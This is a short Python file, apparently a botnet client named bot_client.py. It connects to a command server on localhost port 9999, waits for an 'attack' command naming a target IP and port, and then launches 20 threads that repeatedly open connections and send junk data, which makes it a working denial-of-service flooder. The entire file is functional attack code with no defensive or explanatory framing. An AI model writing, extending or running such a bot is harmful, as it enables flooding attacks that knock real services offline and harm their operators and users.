# bot_client.py
import socket, threading

def attack(ip, port):
    while True:
        try:
            s = socket.socket()
            s.connect((ip, port))
            s.send(b"A" * 1024)
            s.close()
        except:
            pass

client = socket.socket()
client.connect(("127.0.0.1", 9999))

while True:
    cmd = client.recv(1024).decode()
    if cmd.startswith("attack"):
        _, ip, port = cmd.split()
        for _ in range(20):
            threading.Thread(target=attack, args=(ip, int(port))).start()
            
